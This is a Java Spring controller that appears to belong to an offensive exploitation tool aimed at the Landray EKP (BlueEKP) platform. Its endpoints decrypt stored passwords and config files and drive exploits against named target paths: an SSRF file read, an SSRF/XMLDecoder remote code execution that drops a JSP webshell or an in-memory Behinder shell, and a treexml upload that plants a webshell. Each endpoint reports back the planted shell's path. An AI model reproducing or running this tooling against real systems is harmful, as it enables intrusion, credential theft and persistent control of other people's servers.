package com.droplab.Controller.BlueEkp;


import com.droplab.Controller.BlueEkp.Service.BlueEkpDataSysCommonTreexml;
import com.droplab.Controller.BlueEkp.Service.BlueEkpDecode;
import com.droplab.Controller.BlueEkp.Service.BlueEkpSSRF;
import com.droplab.Controller.BlueEkp.Service.BlueEkpSSRFXMLDecode;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Controller
@RequestMapping("/blueekp")
public class BlueEkpController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "BlueEkp/index.html";
    }


    @RequestMapping(value = "/decodePassword", method = RequestMethod.POST)
    public String decodePassword(Model model, @RequestParam(value = "password", required = true) String password) {
        try {
            BlueEkpDecode o = (BlueEkpDecode) Class.forName(getMap().get("BlueEkpDecode")).newInstance();
            String s = o.DecodePassword(password);

            HashMap<String, String> hashMap = new HashMap<>();
            hashMap.put("decodePassword", s);
            model = CommonUtils.modelSet(hashMap, model);
            return "BlueEkp/index.html";
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("decodePassword", "解密错误！！！");
        model = CommonUtils.modelSet(hashMap, model);
        return "BlueEkp/index.html";
    }

    @RequestMapping(value = "/decodeFile", method = RequestMethod.POST)
    public String decodeFile(Model model, @RequestParam("files") List<MultipartFile> files) {
        try {
            for (MultipartFile file : files) {
                String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                try {
                    File file1 = new File(rootPath);
                    file.transferTo(file1);
                    if (file1.exists()) {
                        BlueEkpDecode o = (BlueEkpDecode) Class.forName(getMap().get("BlueEkpDecode")).newInstance();
                        String s = o.DecodePropertiesFile(file1);
                        boolean delete = file1.delete();
                        HashMap<String, String> hashMap = new HashMap<>();
                        hashMap.put("decodeFile", s);
                        model = CommonUtils.modelSet(hashMap, model);
                        return "BlueEkp/index.html";
                    } else {
                        HashMap<String, String> hashMap = new HashMap<>();
                        hashMap.put("decodeFile", "文件上传失败！");
                        model = CommonUtils.modelSet(hashMap, model);
                        return "BlueEkp/index.html";
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("decodeFile", "解密出错！！");
        model = CommonUtils.modelSet(hashMap, model);
        return "BlueEkp/index.html";
    }


    /*
    taget url: /sys/ui/extend/varkind/custom.jsp
     */
    @RequestMapping(value = "/SSRFFileRead", method = RequestMethod.POST)
    public String SSRFFileRead(Model model,
                               @RequestParam(value = "filepath", required = true) String filepath,
                               @RequestParam(value = "url", required = true) String url) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }
        HashMap hashMap = new HashMap();
        hashMap.put("url", url);
        hashMap.put("filepath", filepath);
        try {
            BlueEkpSSRF o = (BlueEkpSSRF) Class.forName(getMap().get("BlueEkpSSRF")).newInstance();
            o.setParams(hashMap);
            Connection.Response exploit = o.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                modelMap.put("SSRFFileReadurl", url);
                modelMap.put("SSRFFileRead", new String(exploit.bodyAsBytes()));
                CommonUtils.modelSet(modelMap, model);
                return "BlueEkp/index.html";
            } else {
                HashMap<String, String> modelMap = new HashMap<>();
                modelMap.put("SSRFFileReadurl", url);
                modelMap.put("SSRFFileRead", "请求出错！");
                CommonUtils.modelSet(modelMap, model);
                return "BlueEkp/index.html";
            }
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("SSRFFileReadurl", url);
        modelMap.put("SSRFFileRead", "请求出错！");
        CommonUtils.modelSet(modelMap, model);
        return "BlueEkp/index.html";
    }


    /**
     * taget url: /sys/ui/extend/varkind/custom.jsp
     *
     * @return
     */
    @RequestMapping(value = "/SSRFXMLDecodeRCE", method = RequestMethod.POST)
    public String SSRFXMLDecodeRCE(Model model,
                                   @RequestParam(value = "files", required = false) List<MultipartFile> files,
                                   @RequestParam(value = "url", required = true) String url,
                                   @RequestParam(value = "type", required = true) String type) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url", url);
            if (type.equals("file")) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                            hashMap.put("type", "file");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            } else if (type.equals("memory")) {
                hashMap.put("type", "memory");
            }
            BlueEkpSSRFXMLDecode aClass = (BlueEkpSSRFXMLDecode) Class.forName(getMap().get("BlueEkpSSRFXMLDecode")).newInstance();
            aClass.setParams(hashMap);
            Connection.Response exploit = aClass.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                modelMap.put("SSRFXMLDecodeRCEurl", url);
                modelMap.put("SSRFXMLDecodeRCE", new String(exploit.bodyAsBytes()));
                modelMap.put("SSRFXMLDecodeRCEtips", String.format("webshell路径：%s/sms_logins_hr.jsp;内存马为冰鞋valve内存马.", url));
                CommonUtils.modelSet(modelMap, model);
                return "BlueEkp/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("SSRFXMLDecodeRCEurl", url);
        modelMap.put("SSRFXMLDecodeRCE", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "BlueEkp/index.html";
    }


    /**
     * taget url:  /data/sys-common/treexml.png
     *
     * @return
     */
    @RequestMapping(value = "/BlueEkpDataSysCommonTreexml", method = RequestMethod.POST)
    public String BlueEkpDataSysCommonTreexml(Model model,
                                              @RequestParam(value = "files", required = false) List<MultipartFile> files,
                                              @RequestParam(value = "url", required = true) String url) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            String filename = CommonUtils.RandomStr(8);
            HashMap hashMap = new HashMap();
            hashMap.put("url", url);
            hashMap.put("filename",filename);
            for (MultipartFile file : files) {
                String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                try {
                    File file1 = new File(rootPath);
                    file.transferTo(file1);
                    if (file1.exists()) {
                        hashMap.put("filepath", rootPath);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            BlueEkpDataSysCommonTreexml aClass = (BlueEkpDataSysCommonTreexml) Class.forName(getMap().get("BlueEkpDataSysCommonTreexml")).newInstance();
            aClass.setParams(hashMap);
            Connection.Response exploit = aClass.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                modelMap.put("BlueEkpDataSysCommonTreexmlurl", url);
                modelMap.put("BlueEkpDataSysCommonTreexml", new String(exploit.bodyAsBytes()));
                modelMap.put("BlueEkpDataSysCommonTreexmltips", String.format("webshell路径：%s/login%s.jsp", url,filename));
                CommonUtils.modelSet(modelMap, model);
                return "BlueEkp/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("BlueEkpDataSysCommonTreexmlurl", url);
        modelMap.put("BlueEkpDataSysCommonTreexml", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "BlueEkp/index.html";
    }

    private Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("BlueEkpDecode", "com.droplab.Controller.BlueEkp.Service.BlueEkpDecode");
        hashMap.put("BlueEkpSSRF", "com.droplab.Controller.BlueEkp.Service.BlueEkpSSRF");
        hashMap.put("BlueEkpSSRFXMLDecode", "com.droplab.Controller.BlueEkp.Service.BlueEkpSSRFXMLDecode");
        hashMap.put("BlueEkpDataSysCommonTreexml", "com.droplab.Controller.BlueEkp.Service.BlueEkpDataSysCommonTreexml");
        return hashMap;
    }
}
